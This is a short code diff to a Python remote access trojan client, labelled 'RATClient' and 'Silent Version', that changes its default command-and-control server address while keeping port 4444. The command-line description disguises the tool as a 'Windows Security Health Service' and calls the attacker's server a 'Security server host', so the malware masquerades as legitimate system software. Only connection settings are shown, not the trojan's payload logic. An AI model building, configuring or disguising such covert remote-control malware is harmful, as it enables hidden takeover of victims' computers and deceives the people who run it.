@@ -30,7 +30,7 @@ from protocol import Protocol, Commands, ResponseTypes
 class RATClient:
     """RAT Client Agent - Silent Version"""
     
-    def __init__(self, server_host='192.168.56.1', server_port=4444):
+    def __init__(self, server_host='172.20.10.2', server_port=4444):
         self.server_host = server_host
         self.server_port = server_port
         self.socket = None
@@ -333,7 +333,7 @@ class RATClient:
 
 def main():
     parser = argparse.ArgumentParser(description='Windows Security Health Service')
-    parser.add_argument('--host', default='192.168.56.1', help='Security server host')
+    parser.add_argument('--host', default='172.20.10.2', help='Security server host')
     parser.add_argument('--port', type=int, default=4444, help='Security server port')
     
     args = parser.parse_args()
